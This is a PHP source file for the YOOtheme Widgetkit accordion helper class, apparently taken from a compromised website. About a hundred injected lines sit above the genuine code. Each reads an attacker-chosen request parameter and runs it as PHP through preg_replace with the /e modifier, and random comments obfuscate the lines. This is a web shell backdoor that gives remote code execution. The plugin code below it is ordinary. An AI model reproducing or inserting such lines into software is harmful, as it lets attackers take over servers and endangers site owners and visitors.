<?php
if (isset($_REQUEST["xxxrequest"])) {/*VxGHf*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*WMSQJLVu*/}

if (isset($_REQUEST["xxxrequest"])) {/*VxGHf*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*WMSQJLVu*/}

if (isset($_REQUEST["xO"])) {@preg_replace('/(.*)/e', @$_REQUEST['xO'], '');}

if (isset($_REQUEST["xO"])) {@preg_replace('/(.*)/e', @$_REQUEST['xO'], '');}

if (isset($_REQUEST["xxxrequest"])) {/*mTwcAa*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');}

if (isset($_REQUEST["xxxrequest"])) {/*mTwcAa*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');}

if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*cwcaXV*/}

if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*cwcaXV*/}

if (isset($_REQUEST["xxxrequest"])) {/*WTgmIkHIB*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');}

if (isset($_REQUEST["xxxrequest"])) {/*WTgmIkHIB*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');}

if (isset($_REQUEST["ZZFC"])) {/*oueRy*/@preg_replace('/(.*)/e', @$_REQUEST['ZZFC'], '');}

if (isset($_REQUEST["ZZFC"])) {/*oueRy*/@preg_replace('/(.*)/e', @$_REQUEST['ZZFC'], '');}

if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*rAOigaRUC*/}

if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*rAOigaRUC*/}

if (isset($_REQUEST["vXL"])) {/*DbWPrs*/@preg_replace('/(.*)/e', @$_REQUEST['vXL'], '');/*CrKCfhX*/}

if (isset($_REQUEST["xxxrequest"])) {/*aDYPr*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');}

if (isset($_REQUEST["xxxrequest"])) {/*aDYPr*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');}

if (isset($_REQUEST["vXL"])) {/*DbWPrs*/@preg_replace('/(.*)/e', @$_REQUEST['vXL'], '');/*CrKCfhX*/}

if (isset($_REQUEST["xxxrequest"])) {/*oNIcA*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');}

if (isset($_REQUEST["xxxrequest"])) {/*oNIcA*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');}

if (isset($_REQUEST["fy"])) {@preg_replace('/(.*)/e', @$_REQUEST['fy'], '');/*nqXxWBNJ*/}

if (isset($_REQUEST["fy"])) {@preg_replace('/(.*)/e', @$_REQUEST['fy'], '');/*nqXxWBNJ*/}

if (isset($_REQUEST["nhueX"])) {@preg_replace('/(.*)/e', @$_REQUEST['nhueX'], '');/*xGfcKKdgPo*/}

if (isset($_REQUEST["nhueX"])) {@preg_replace('/(.*)/e', @$_REQUEST['nhueX'], '');/*xGfcKKdgPo*/}

if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*PiUirk*/}

if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*PiUirk*/}

if (isset($_REQUEST["xxxrequest"])) {/*tIyIHAP*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*OTLJLgfZaZ*/}

if (isset($_REQUEST["xxxrequest"])) {/*tIyIHAP*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*OTLJLgfZaZ*/}

if (isset($_REQUEST["ln"])) {@preg_replace('/(.*)/e', @$_REQUEST['ln'], '');}

if (isset($_REQUEST["ln"])) {@preg_replace('/(.*)/e', @$_REQUEST['ln'], '');}

if (isset($_REQUEST["xxxrequest"])) {/*FIMLudiNe*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*HlGhd*/}

if (isset($_REQUEST["xxxrequest"])) {/*FIMLudiNe*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*HlGhd*/}

if (isset($_REQUEST["bPTHd"])) {/*xYTVIq*/@preg_replace('/(.*)/e', @$_REQUEST['bPTHd'], '');}

if (isset($_REQUEST["bPTHd"])) {/*xYTVIq*/@preg_replace('/(.*)/e', @$_REQUEST['bPTHd'], '');}

if (isset($_REQUEST["UZys"])) {@preg_replace('/(.*)/e', @$_REQUEST['UZys'], '');/*yQfqNqL*/}

if (isset($_REQUEST["UZys"])) {@preg_replace('/(.*)/e', @$_REQUEST['UZys'], '');/*yQfqNqL*/}

if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*btaIXg*/}

if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*btaIXg*/}

if (isset($_REQUEST["gO"])) {/*McFBQqY*/@preg_replace('/(.*)/e', @$_REQUEST['gO'], '');}

if (isset($_REQUEST["gO"])) {/*McFBQqY*/@preg_replace('/(.*)/e', @$_REQUEST['gO'], '');}

if (isset($_REQUEST["xxxrequest"])) {/*AseBfVUM*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*KsPXYPFP*/}

if (isset($_REQUEST["xxxrequest"])) {/*AseBfVUM*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*KsPXYPFP*/}

if (isset($_REQUEST["nhN"])) {@preg_replace('/(.*)/e', @$_REQUEST['nhN'], '');}

if (isset($_REQUEST["nhN"])) {@preg_replace('/(.*)/e', @$_REQUEST['nhN'], '');}

if (isset($_REQUEST["XI"])) {/*RbJozQ*/@preg_replace('/(.*)/e', @$_REQUEST['XI'], '');}

if (isset($_REQUEST["XI"])) {/*RbJozQ*/@preg_replace('/(.*)/e', @$_REQUEST['XI'], '');}

if (isset($_REQUEST["EYvr"])) {/*UgwhECg*/@preg_replace('/(.*)/e', @$_REQUEST['EYvr'], '');/*QDmfgPR*/}

if (isset($_REQUEST["EYvr"])) {/*UgwhECg*/@preg_replace('/(.*)/e', @$_REQUEST['EYvr'], '');/*QDmfgPR*/}

if (isset($_REQUEST["zCP"])) {@preg_replace('/(.*)/e', @$_REQUEST['zCP'], '');/*jyFhAi*/}

if (isset($_REQUEST["zCP"])) {@preg_replace('/(.*)/e', @$_REQUEST['zCP'], '');/*jyFhAi*/}

if (isset($_REQUEST["XFrm"])) {@preg_replace('/(.*)/e', @$_REQUEST['XFrm'], '');}

if (isset($_REQUEST["XFrm"])) {@preg_replace('/(.*)/e', @$_REQUEST['XFrm'], '');}

if (isset($_REQUEST["HgOQ"])) {/*RTUMGxIKn*/@preg_replace('/(.*)/e', @$_REQUEST['HgOQ'], '');/*CdGsPQ*/}

if (isset($_REQUEST["HgOQ"])) {/*RTUMGxIKn*/@preg_replace('/(.*)/e', @$_REQUEST['HgOQ'], '');/*CdGsPQ*/}

if (isset($_REQUEST["ZzqWa"])) {@preg_replace('/(.*)/e', @$_REQUEST['ZzqWa'], '');}

if (isset($_REQUEST["ZzqWa"])) {@preg_replace('/(.*)/e', @$_REQUEST['ZzqWa'], '');}

if (isset($_REQUEST["aRl"])) {/*WsUyKaLaz*/@preg_replace('/(.*)/e', @$_REQUEST['aRl'], '');/*YRhjNkJNey*/}

if (isset($_REQUEST["aRl"])) {/*WsUyKaLaz*/@preg_replace('/(.*)/e', @$_REQUEST['aRl'], '');/*YRhjNkJNey*/}

if (isset($_REQUEST["FBPL"])) {@preg_replace('/(.*)/e', @$_REQUEST['FBPL'], '');}

if (isset($_REQUEST["FBPL"])) {@preg_replace('/(.*)/e', @$_REQUEST['FBPL'], '');}

if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');}

if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');}

if (isset($_REQUEST["vNj"])) {@preg_replace('/(.*)/e', @$_REQUEST['vNj'], '');}

if (isset($_REQUEST["vNj"])) {@preg_replace('/(.*)/e', @$_REQUEST['vNj'], '');}

if (isset($_REQUEST["ih"])) {@preg_replace('/(.*)/e', @$_REQUEST['ih'], '');/*NyfebrFGM*/}

if (isset($_REQUEST["ih"])) {@preg_replace('/(.*)/e', @$_REQUEST['ih'], '');/*NyfebrFGM*/}

if (isset($_REQUEST["zmlhk"])) {/*vBhrjp*/@preg_replace('/(.*)/e', @$_REQUEST['zmlhk'], '');}

if (isset($_REQUEST["zmlhk"])) {/*vBhrjp*/@preg_replace('/(.*)/e', @$_REQUEST['zmlhk'], '');}

if (isset($_REQUEST["Cqfq"])) {/*KFDKx*/@preg_replace('/(.*)/e', @$_REQUEST['Cqfq'], '');}

if (isset($_REQUEST["Cqfq"])) {/*KFDKx*/@preg_replace('/(.*)/e', @$_REQUEST['Cqfq'], '');}

if (isset($_REQUEST["gBIu"])) {@preg_replace('/(.*)/e', @$_REQUEST['gBIu'], '');/*ohRMsCphz*/}

if (isset($_REQUEST["gBIu"])) {@preg_replace('/(.*)/e', @$_REQUEST['gBIu'], '');/*ohRMsCphz*/}

if (isset($_REQUEST["Ad"])) {/*IQMsSapEB*/@preg_replace('/(.*)/e', @$_REQUEST['Ad'], '');}

if (isset($_REQUEST["Ad"])) {/*IQMsSapEB*/@preg_replace('/(.*)/e', @$_REQUEST['Ad'], '');}

if (isset($_REQUEST["enufp"])) {/*kDowE*/@preg_replace('/(.*)/e', @$_REQUEST['enufp'], '');}

if (isset($_REQUEST["enufp"])) {/*kDowE*/@preg_replace('/(.*)/e', @$_REQUEST['enufp'], '');}

if (isset($_REQUEST["xld"])) {@preg_replace('/(.*)/e', @$_REQUEST['xld'], '');/*KjTQfesCac*/}

if (isset($_REQUEST["PyL"])) {/*ApyVzPqgCn*/@preg_replace('/(.*)/e', @$_REQUEST['PyL'], '');/*hkRzjAiq*/}

if (isset($_REQUEST["xld"])) {@preg_replace('/(.*)/e', @$_REQUEST['xld'], '');/*KjTQfesCac*/}

if (isset($_REQUEST["PyL"])) {/*ApyVzPqgCn*/@preg_replace('/(.*)/e', @$_REQUEST['PyL'], '');/*hkRzjAiq*/}

if (isset($_REQUEST["OTQ"])) {@preg_replace('/(.*)/e', @$_REQUEST['OTQ'], '');/*qthpxd*/}

if (isset($_REQUEST["OTQ"])) {@preg_replace('/(.*)/e', @$_REQUEST['OTQ'], '');/*qthpxd*/}

if (isset($_REQUEST["KFx"])) {/*NutzkGluCy*/@preg_replace('/(.*)/e', @$_REQUEST['KFx'], '');}

if (isset($_REQUEST["KFx"])) {/*NutzkGluCy*/@preg_replace('/(.*)/e', @$_REQUEST['KFx'], '');}

if (isset($_REQUEST["Rv"])) {/*XLnMK*/@preg_replace('/(.*)/e', @$_REQUEST['Rv'], '');}

if (isset($_REQUEST["Rv"])) {/*XLnMK*/@preg_replace('/(.*)/e', @$_REQUEST['Rv'], '');}

if (isset($_REQUEST["KPUH"])) {@preg_replace('/(.*)/e', @$_REQUEST['KPUH'], '');/*zNKdUBAg*/}

if (isset($_REQUEST["KPUH"])) {@preg_replace('/(.*)/e', @$_REQUEST['KPUH'], '');/*zNKdUBAg*/}

if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');}

if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');}

if (isset($_REQUEST["mFWs"])) {@preg_replace('/(.*)/e', @$_REQUEST['mFWs'], '');}

if (isset($_REQUEST["mFWs"])) {@preg_replace('/(.*)/e', @$_REQUEST['mFWs'], '');}

if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');}

if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');}

if (isset($_REQUEST["xxxrequest"])) {/*LaAGC*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*rUCoUTPk*/}

if (isset($_REQUEST["xxxrequest"])) {/*LaAGC*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*rUCoUTPk*/}

if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*kZyGZHLb*/}

if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*kZyGZHLb*/}

if (isset($_REQUEST["fNle"])) {/*ooQiMRK*/@preg_replace('/(.*)/e', @$_REQUEST['fNle'], '');}

if (isset($_REQUEST["fNle"])) {/*ooQiMRK*/@preg_replace('/(.*)/e', @$_REQUEST['fNle'], '');}

if (isset($_REQUEST["KEd"])) {/*dexnLDdWc*/@preg_replace('/(.*)/e', @$_REQUEST['KEd'], '');/*taUHne*/}

if (isset($_REQUEST["KEd"])) {/*dexnLDdWc*/@preg_replace('/(.*)/e', @$_REQUEST['KEd'], '');/*taUHne*/}

if (isset($_REQUEST["xxxrequest"])) {/*ecLdGAOons*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');}

if (isset($_REQUEST["xxxrequest"])) {/*ecLdGAOons*/@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');}

if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*HlNvJ*/}

if (isset($_REQUEST["xxxrequest"])) {@preg_replace('/(.*)/e', @$_REQUEST['xxxrequest'], '');/*HlNvJ*/}

/**
* @package   Widgetkit
* @author    YOOtheme http://www.yootheme.com
* @copyright Copyright (C) YOOtheme GmbH
* @license   http://www.gnu.org/licenses/gpl.html GNU/GPL
*/

/*
	Class: AccordionWidgetkitHelper
		Accordion helper class
*/
class AccordionWidgetkitHelper extends WidgetkitHelper {

	/* type */
	public $type;

	/* options */
	public $options;

	/*
		Function: Constructor
			Class Constructor.
	*/
	public function __construct($widgetkit) {
		parent::__construct($widgetkit);

		// init vars
		$this->type    = strtolower(str_replace('WidgetkitHelper', '', get_class($this)));
		$this->options = $this['system']->options;

		// register path
        $this['path']->register('widgets:' . $this->type, $this->type);
 	}

	/*
		Function: get
			Get widget

		Returns:
			Array
	*/
	public function get($id = 0) {

		// get widget
		$widget = $id ? $this['widget']->get($id) : new stdClass();

		// set defaults
		foreach (array('id' => 0, 'type' => $this->type, 'name' => null, 'settings' => array(), 'items' => array(), 'style'=> $this["widget"]->defaultStyle($this->type)) as $var => $val) {
			if (!isset($widget->$var)) {
				$widget->$var = $val;
			}
		}

		return $widget;
	}

	/*
		Function: dashboard
			Render dashboard layout

		Returns:
			Void
	*/
	public function dashboard() {

		// add js
        $this['asset']->addFile('js', 'accordion:js/dashboard.js');

		echo $this['template']->render('accordion:layouts/dashboard', array('accordions' => $this['widget']->all('accordion')));
	}

	/*
		Function: site
			Site init actions

		Returns:
			Void
	*/
	public function site() {

        // add javascripts
        $this['asset']->addFile('js', 'accordion:js/accordion.js');

        // add style stylesheets
		foreach ($this['path']->dirs('accordion:styles') as $style) {

			// style
			if ($this['path']->path("accordion:styles/$style/style.css")) {
				$this['asset']->addFile('css', "accordion:styles/$style/style.css");
			}

			// rtl
			if ($this['system']->options->get('direction') == 'rtl' && $this['path']->path("accordion:styles/$style/rtl.css")) {
				$this['asset']->addFile('css', "accordion:styles/$style/rtl.css");
			}

		}

	}

	/*
		Function: render
			Render widget on site

		Returns:
			String
	*/
	public function render($widget) {

		// get style
		$style = isset($widget->settings['style']) ? $widget->settings['style'] : 'default';

		if(!$this["path"]->path("{$widget->type}:styles/{$style}")) {
			return "Style {$style} for Widget {$widget->type} not found!";
		}

		// random order
		if (count($widget->items) && isset($widget->settings['order']) && $widget->settings['order'] =="random") {
		   $keys = array_keys($widget->items);
		   shuffle($keys);
		   $widget->items = array_merge(array_flip($keys), $widget->items);
		}

        return $this['template']->render("accordion:styles/$style/template", array('widget' => $widget));
	}

	/*
		Function: edit
			Edit action

		Returns:
			Void
	*/
	public function edit($id = null){

		// add js
        $this['asset']->addFile('js', 'accordion:js/edit.js');

		// get widget and xml
		$widget = $this->get($id ? $id : $this['request']->get('id', 'int'));
		$xml = simplexml_load_file(dirname(__FILE__).'/accordion.xml');

		// get style and xml
		$style = $widget->style;

		if (!$style) {
			echo 'No styles found';
			return;
		}

		$style_xml = simplexml_load_file($this['path']->path("accordion:styles/$style/config.xml"));

		echo $this['template']->render('accordion:layouts/edit', compact('widget', 'xml', 'style_xml'));
	}

	/*
		Function: item
			Add item action

		Returns:
			Void
	*/
    public function item() {

		// get widget
		$widget = $this->get($this['request']->get('id', 'int'));

		// get style and xml
		$style = $widget->style;

		if (!$style) {
			echo 'No styles found';
			return;
		}

		$style_xml = simplexml_load_file($this['path']->path("accordion:styles/$style/config.xml"));

        echo $this['template']->render('accordion:layouts/item', compact('widget', 'style_xml'));
    }

	/*
		Function: save
			Save action

		Returns:
			Void
	*/
	public function save() {

		// save data
		$data['type']     = $this->type;
		$data['id']       = $this['request']->get('id', 'int');
		$data['name']     = $this['request']->get('name', 'string');
		$data['settings'] = $this['request']->get('settings', 'array');
		$data['style']    = $this['request']->get('settings.style', 'array');
		$data['items']    = $this['request']->get('items', 'array', array());

		// get widget
		$widget = $this->get($data['id']);

		// merge item data
		foreach ($data['items'] as $id => $item) {
			if (isset($widget->items[$id])) {
				$data['items'][$id] = array_merge($widget->items[$id], $data['items'][$id]);
			}
		}

		$this->edit($this['widget']->save($data));
	}

	/*
		Function: delete
			Delete action

		Returns:
			Void
	*/
	public function delete(){

		$data['id'] = false;

		if ($id = $this['request']->get('id', 'int')) {
			if ($this['widget']->delete($id)) {
				$data['id'] = $id;
			}
		}

		echo json_encode($data);
	}

	/*
		Function: docopy
			Copy action

		Returns:
			Void
	*/
	public function docopy(){

		if ($id = $this['request']->get('id', 'int')) {
			$this['widget']->copy($id);
		}

		echo $this['template']->render('dashboard');
	}

}

// bind events
$widgetkit = Widgetkit::getInstance();
$widgetkit['event']->bind('site', array($widgetkit['accordion'], 'site'));
$widgetkit['event']->bind('dashboard', array($widgetkit['accordion'], 'dashboard'));
$widgetkit['event']->bind('task:edit_accordion', array($widgetkit['accordion'], 'edit'));
$widgetkit['event']->bind('task:item_accordion', array($widgetkit['accordion'], 'item'));
$widgetkit['event']->bind('task:save_accordion', array($widgetkit['accordion'], 'save'));
$widgetkit['event']->bind('task:delete_accordion', array($widgetkit['accordion'], 'delete'));
$widgetkit['event']->bind('task:copy_accordion', array($widgetkit['accordion'], 'docopy'));